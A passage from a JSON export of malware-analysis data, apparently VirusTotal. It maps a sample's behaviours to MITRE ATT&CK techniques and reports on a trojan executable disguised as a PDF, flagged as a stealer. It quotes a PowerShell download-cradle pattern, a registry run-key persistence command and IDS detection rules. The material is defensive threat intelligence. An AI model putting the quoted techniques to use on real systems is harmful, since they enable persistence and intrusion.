                    "description": "Contains capabilities to detect virtual machines"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts.\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1105/",
                "id": "T1105",
                "name": "Ingress Tool Transfer"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Spawns processes"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates a process in suspended mode (likely to inject code)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the user directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Creates files in the recycle bin to hide itself"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/001/",
                "id": "T1564.001",
                "name": "Hidden Files and Directories"
              },
              {
                "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses cacls to modify the permissions of files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/010/",
                "id": "T1574.010",
                "name": "Services File Permissions Weakness"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Spawns processes"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates a process in suspended mode (likely to inject code)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution. To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses net.exe to stop services"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/003/",
                "id": "T1543.003",
                "name": "Windows Service"
              },
              {
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Stores files to the Windows startup directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder"
              },
              {
                "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses cacls to modify the permissions of files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/010/",
                "id": "T1574.010",
                "name": "Services File Permissions Weakness"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "link function at runtime on Windows"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "accept command line arguments"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \nOn Windows, there are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden. \nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "hide graphical window"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/003/",
                "id": "T1564.003",
                "name": "Hidden Window"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "encode data using XOR"
                  },
                  {
                    "severity": "INFO",
                    "description": "encrypt data using RC4 PRGA"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/3ee706f07d13cb9e617eac2b4442479634ab48f11005568c739c6dcab75052a4/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65ab9c501a25003ff02a355a"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T173052344B3BC5755CF2503F09D90002C0B7D742EAB70EB6A8E8A69DB96577234A43B9F",
      "vhash": "285036751513208219265011",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "creation_date": 1705541551,
      "names": [
        "njRB.exe",
        "HESAP____________________________________________________________________________________________ BEYANI.___PDF.exe",
        "8e436dc374b71fcb5168d9bba73804267770466a94f4ac20785009c8799bc803"
      ],
      "signature_info": {
        "product": "DogRace",
        "internal name": "njRB.exe",
        "copyright": "Copyright ©  Translator WWQ",
        "original name": "njRB.exe",
        "file version": "3.4.0.0",
        "description": "DogRace"
      },
      "last_modification_date": 1705734447,
      "type_tag": "peexe",
      "times_submitted": 3,
      "total_votes": {
        "harmless": 0,
        "malicious": 2
      },
      "size": 871424,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.msil/taskun",
        "popular_threat_category": [
          {
            "count": 30,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 13,
            "value": "msil"
          },
          {
            "count": 7,
            "value": "taskun"
          },
          {
            "count": 2,
            "value": "kukau"
          }
        ]
      },
      "authentihash": "8ff37eb22854c62b97ce4f6fcbbfea50c9389f609d9fedefcf6c1af69251a254",
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "v4.0.30319",
            "type": "Library",
            "name": ".NET"
          },
          {
            "type": "Linker",
            "name": "Microsoft Linker"
          }
        ]
      },
      "last_submission_date": 1705682275,
      "meaningful_name": "njRB.exe",
      "crowdsourced_ids_stats": {
        "high": 0,
        "info": 0,
        "medium": 2,
        "low": 1
      },
      "trid": [
        {
          "file_type": "Generic CIL Executable (.NET, Mono, etc.)",
          "probability": 71.1
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 10.2
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 6.3
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 4.3
        },
        {
          "file_type": "Windows Icons Library (generic)",
          "probability": 2
        }
      ],
      "sandbox_verdicts": {
        "C2AE": {
          "category": "malicious",
          "confidence": 70,
          "sandbox_name": "C2AE",
          "malware_classification": [
            "STEALER"
          ],
          "malware_names": [
            "BluStealer"
          ]
        },
        "Yomi Hunter": {
          "category": "malicious",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "8e436dc374b71fcb5168d9bba73804267770466a94f4ac20785009c8799bc803",
      "type_extension": "exe",
      "tags": [
        "spreader",
        "peexe",
        "assembly"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "Attempted Information Leak",
          "alert_severity": "medium",
          "rule_msg": "ET POLICY IP Check Domain (showip in HTTP Host)",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET POLICY IP Check Domain (showip in HTTP Host)\"; flow:established,to_server; http.method; content:\"GET\"; http.host; content:\"showip.\"; fast_pattern; pcre:\"/^[^\\r\\n]*showip\\.[a-z]+(?:\\x3a\\d{1,5})?\\r?$/Wm\"; reference:url,doc.emergingthreats.net/2008987; classtype:attempted-recon; sid:2008987; rev:9; metadata:created_at 2010_07_30, former_category POLICY, updated_at 2022_12_09;)",
          "rule_references": [
            "https://doc.emergingthreats.net/2008987"
          ],
          "alert_context": [
            {
              "url": "http://showip.net/",
              "hostname": "showip.net",
              "dest_port": 80,
              "dest_ip": "162.55.60.2"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2008987"
        },
        {
          "rule_category": "Device Retrieving External IP Address Detected",
          "alert_severity": "medium",
          "rule_msg": "ET HUNTING [ANY.RUN] DARKCLOUD Style External IP Check",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET HUNTING [ANY.RUN] DARKCLOUD Style External IP Check\"; flow:established,to_server; http.start; content:\"GET|20 2f 20|HTTP|2f|1|2e|1|0d 0a|User|2d|Agent|3a 20|Project1|0d 0a|Host|3a 20|showip|2e|net|0d 0a 0d 0a|\"; bsize:58; fast_pattern; reference:url,community.emergingthreats.net/t/darkcloud/844; classtype:external-ip-check; sid:2047083; rev:1; metadata:attack_target Client_Endpoint, created_at 2023_08_08, deployment Perimeter, deployment SSLDecrypt, former_category HUNTING, malware_family DarkCloud, confidence High, signature_severity Informational, updated_at 2023_08_08;)",
          "rule_references": [
            "https://community.emergingthreats.net/t/darkcloud/844"
          ],
          "alert_context": [
            {
              "url": "http://showip.net/",
              "hostname": "showip.net",
              "dest_port": 80,
              "dest_ip": "162.55.60.2"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2047083"
        },
        {
          "rule_category": "unknown",
          "alert_severity": "low",
          "rule_msg": "(http_inspect) invalid status line",
          "rule_raw": "alert ( gid:119; sid:279; rev:1; msg:\"(http_inspect) invalid status line\"; metadata: rule-type preproc; classtype:unknown;)",
          "alert_context": [
            {
              "dest_port": 80,
              "dest_ip": "162.55.60.2"
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "119:279"
        }
      ],
      "last_analysis_date": 1705692465,
      "unique_sources": 3,
      "first_submission_date": 1705563770,
      "sha1": "ff4e722708bc2f25cc17908091aad7645c446076",
      "ssdeep": "24576:Uc/MERbgWhZnE5evnYrPJBoz8vxnt/qjC/ypAosmF43YMS4gvu:Uc/T/7E5egrj5F52CSA0aYHR",
      "md5": "5214925401a3a4308de915683c2ad217",
      "dot_net_assembly": {
        "entry_point_token": 100663333,
        "metadata_header_rva": 19288,
        "manifest_resource": [
          "DogRace.Form1.resources",
          "DogRace.Properties.Resources.resources",
          "Translator.Main.resources"
        ],
        "assembly_flags": 3,
        "strongname_va": 0,
        "tables_rows_map_log": "48688797474564445544",
        "external_assemblies": {
          "System.Drawing": {
            "version": "4.0.0.0"
          },
          "System": {
            "version": "4.0.0.0"
          },
          "mscorlib": {
            "version": "4.0.0.0"
          },
          "System.Windows.Forms": {
            "version": "4.0.0.0"
          }
        },
        "type_definition_list": [
          {
            "type_definitions": [
              "AssemblyTitleAttribute",
              "AssemblyDescriptionAttribute",
              "AssemblyConfigurationAttribute",
              "AssemblyCompanyAttribute",
              "AssemblyProductAttribute",
              "AssemblyCopyrightAttribute",
              "AssemblyTrademarkAttribute",
              "AssemblyFileVersionAttribute",
              "Assembly",
              "MethodInfo",
              "MethodBase"
            ],
            "namespace": "System.Reflection"
          },
          {
            "type_definitions": [
              "CompilationRelaxationsAttribute",
              "RuntimeCompatibilityAttribute",
              "CompilerGeneratedAttribute",
              "RuntimeHelpers"
            ],
            "namespace": "System.Runtime.CompilerServices"
          },
          {
            "type_definitions": [
              "DebuggableAttribute",
              "DebuggerNonUserCodeAttribute"
            ],
            "namespace": "System.Diagnostics"
          },
          {
            "type_definitions": [
              "IEnumerator",
              "IEnumerable"
            ],
            "namespace": "System.Collections"
          },
          {
            "type_definitions": [
              "StringBuilder",
              "Encoding"
            ],
            "namespace": "System.Text"
          },
          {
            "type_definitions": [
              "Object",
              "EventArgs",
              "IDisposable",
              "Random",
              "Decimal",
              "Type",
              "STAThreadAttribute",
              "ValueType",
              "String",
              "Byte",
              "RuntimeTypeHandle",
              "EventHandler",
              "Array",
              "RuntimeFieldHandle",
              "Char",
              "AppDomain",
              "Int32"
            ],
            "namespace": "System"
          },
          {
            "type_definitions": [
              "ComVisibleAttribute",
              "GuidAttribute"
            ],
            "namespace": "System.Runtime.InteropServices"
          },
          {
            "type_definitions": [
              "ApplicationSettingsBase",
              "SettingsBase"
            ],
            "namespace": "System.Configuration"
          },
          {
            "type_definitions": [
              "Bitmap",
              "Point",
              "Size",
              "SizeF",
              "Icon",
              "Image"
            ],
            "namespace": "System.Drawing"
          },
          {
            "type_definitions": [
              "IContainer",
              "ComponentResourceManager",
              "EditorBrowsableState",
              "EditorBrowsableAttribute",
              "Container",
              "ISupportInitialize"
            ],
            "namespace": "System.ComponentModel"
          },
          {
            "type_definitions": [
              "TargetFrameworkAttribute"
            ],
            "namespace": "System.Runtime.Versioning"
          },
          {
            "type_definitions": [
              "Form",
              "Panel",
              "Label",
              "TextBox",
              "DataGridView",
              "DataGridViewTextBoxColumn",
              "Button",
              "LinkLabel",
              "ContextMenuStrip",
              "ToolStripMenuItem",
              "MouseEventArgs",
              "DataGridViewRow",
              "Timer",
              "PictureBox",
              "GroupBox",
              "RadioButton",
              "NumericUpDown",
              "Control",
              "MessageBox",
              "DialogResult",
